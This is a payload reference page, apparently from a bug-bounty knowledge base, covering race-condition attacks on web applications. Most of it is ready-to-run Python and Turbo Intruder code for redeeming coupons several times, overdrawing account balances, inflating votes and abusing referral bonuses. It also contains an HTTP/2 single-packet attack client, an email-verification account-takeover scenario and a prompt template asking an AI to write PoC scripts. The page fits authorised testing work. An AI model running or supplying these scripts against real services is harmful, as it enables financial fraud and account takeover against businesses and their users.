---
id: "race-condition-payloads"
title: "Race Condition Payloads & Techniques"
type: "payload"
category: "web-application"
subcategory: "race-conditions"
tags: ["race-condition", "toctou", "concurrency", "payload", "business-logic"]
difficulty: "advanced"
platforms: ["linux", "macos", "windows"]
related: ["vulnerability-priority-matrix", "attack-workflow-chains"]
updated: "2026-04-04"
---

## Overview

Race condition payloads exploit time-of-check-to-time-of-use (TOCTOU) windows in web applications. These are high-impact, often overlooked, and can lead to financial fraud, privilege escalation, or data corruption.

## Payloads

### Limit Bypass — Coupon/Promo Code

Redeem a single-use coupon multiple times

- **Contexts**: e-commerce, business-logic
- **Severity**: high

```python
import requests
import threading

url = "https://target.com/api/apply-coupon"
headers = {"Authorization": "Bearer TOKEN", "Content-Type": "application/json"}
data = {"coupon_code": "SAVE50"}

def apply_coupon():
    r = requests.post(url, json=data, headers=headers)
    print(f"Status: {r.status_code} | Response: {r.text[:100]}")

# Send 50 concurrent requests
threads = [threading.Thread(target=apply_coupon) for _ in range(50)]
for t in threads: t.start()
for t in threads: t.join()
```

### Limit Bypass — Account Balance / Transfer

Send money multiple times from insufficient balance

- **Contexts**: fintech, business-logic
- **Severity**: critical

```python
import requests
import threading

url = "https://target.com/api/transfer"
headers = {"Authorization": "Bearer TOKEN", "Content-Type": "application/json"}

def transfer():
    data = {"to_account": "attacker_id", "amount": 100}
    r = requests.post(url, json=data, headers=headers)
    print(f"Transfer: {r.status_code} | {r.text[:100]}")

# Balance is 100, try to transfer 100 x 20 times
threads = [threading.Thread(target=transfer) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()

# Check: did more than $100 get transferred?
```

### Limit Bypass — Vote/Like Manipulation

Vote or like multiple times past the limit

- **Contexts**: social, business-logic
- **Severity**: medium

```python
import requests
import threading

url = "https://target.com/api/vote"
headers = {"Authorization": "Bearer TOKEN"}
data = {"post_id": "12345", "vote": "up"}

def vote():
    r = requests.post(url, json=data, headers=headers)
    print(f"Vote: {r.status_code}")

threads = [threading.Thread(target=vote) for _ in range(100)]
for t in threads: t.start()
for t in threads: t.join()
```

### Limit Bypass — Invitation / Referral Abuse

Claim referral bonuses multiple times

- **Contexts**: referral, business-logic
- **Severity**: high

```python
import requests
import threading

url = "https://target.com/api/claim-referral"
headers = {"Authorization": "Bearer TOKEN"}
data = {"referral_code": "BONUS123"}

def claim():
    r = requests.post(url, json=data, headers=headers)
    print(f"Claim: {r.status_code} | {r.text[:100]}")

threads = [threading.Thread(target=claim) for _ in range(30)]
for t in threads: t.start()
for t in threads: t.join()
```

### Turbo Intruder Script (Burp Suite)

Race condition testing with Burp Suite's Turbo Intruder

- **Contexts**: burp, any
- **Severity**: varies

```python
# Turbo Intruder script — single-packet attack
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          engine=Engine.BURP2)

    # Queue 30 identical requests
    for i in range(30):
        engine.queue(target.req, gate='race1')

    # Release all at once (single-packet attack)
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

### HTTP/2 Single-Packet Attack

Send multiple requests in a single TCP packet for precise timing

- **Contexts**: http2, any
- **Severity**: varies

```python
"""
HTTP/2 single-packet attack — all requests arrive simultaneously
because they're multiplexed in one TCP packet.
More reliable than threading for race conditions.
"""
import h2.connection
import h2.config
import h2.events
import socket
import ssl

def single_packet_attack(host, port, requests_data):
    ctx = ssl.create_default_context()
    ctx.set_alpn_protocols(['h2'])

    sock = socket.create_connection((host, port))
    sock = ctx.wrap_socket(sock, server_hostname=host)

    config = h2.config.H2Configuration(client_side=True)
    conn = h2.connection.H2Connection(config=config)
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())

    # Queue all requests without flushing
    stream_ids = []
    for req in requests_data:
        sid = conn.get_next_available_stream_id()
        stream_ids.append(sid)
        conn.send_headers(sid, req['headers'])
        if req.get('body'):
            conn.send_data(sid, req['body'].encode())
        conn.end_stream(sid)

    # Flush all at once — single packet
    sock.sendall(conn.data_to_send())

    # Read responses
    responses = {}
    while len(responses) < len(stream_ids):
        data = sock.recv(65535)
        events = conn.receive_data(data)
        for event in events:
            if isinstance(event, h2.events.ResponseReceived):
                responses[event.stream_id] = {'headers': event.headers}
            elif isinstance(event, h2.events.DataReceived):
                responses.setdefault(event.stream_id, {})
                responses[event.stream_id]['data'] = event.data
        sock.sendall(conn.data_to_send())

    sock.close()
    return responses
```

### Database Row Locking Bypass

Exploit missing database locks on concurrent updates

- **Contexts**: database, business-logic
- **Severity**: high

```
Target scenarios where the app:
1. READS a value (e.g., account balance)
2. CHECKS a condition (e.g., balance >= withdrawal)
3. UPDATES the value (e.g., balance -= withdrawal)

If steps 1-3 are not atomic (no SELECT FOR UPDATE or transaction),
concurrent requests can all pass the check before any update executes.

Test methodology:
1. Identify the vulnerable endpoint
2. Determine the constraint (balance, inventory, etc.)
3. Send N concurrent requests where N × amount > constraint
4. Verify: did the total exceed the constraint?
```

### Email Verification Race

Register/claim an email during the verification window

- **Contexts**: registration, email-verification
- **Severity**: high

```
Scenario: App sends verification email, account is "pending"

Attack:
1. Register as victim@target.com (verification email sent)
2. Simultaneously: register as victim@target.com with YOUR email
3. Or: claim the account before verification completes
4. Race the verification token against a password reset

Test:
- Send registration request
- Immediately send password reset for same email
- Check if reset token is generated for unverified account
```

## Detection Methodology

```
1. Identify race-prone endpoints:
   □ Financial operations (transfer, purchase, withdraw)
   □ One-time actions (coupon redemption, invitation claim)
   □ Counter operations (likes, votes, views)
   □ Account operations (registration, email change)
   □ File operations (upload + process)
   □ Inventory management (stock decrements)

2. Determine the time window:
   □ Database operations without transactions → large window
   □ Distributed systems with eventual consistency → large window
   □ In-memory operations without locks → small window (need H2 single-packet)

3. Choose attack method:
   □ Large window → Python threading (simple, effective)
   □ Small window → Turbo Intruder or H2 single-packet attack
   □ Very small window → HTTP/2 multiplexing (most precise)

4. Verify impact:
   □ Did the action execute more times than allowed?
   □ Was a financial constraint violated?
   □ Was a uniqueness constraint broken?
   □ Calculate total impact (amount × successful extra executions)
```

## Deep Dig Prompts

```
I found an endpoint at {url} that handles {operation}.
It appears to have a race condition window because {evidence}.

1. What's the best attack method for this window size?
2. Generate a PoC script for this specific endpoint.
3. How should I calculate and present the financial impact?
4. What's the expected severity/bounty for this type of finding?
5. How can I demonstrate maximum impact safely?
```
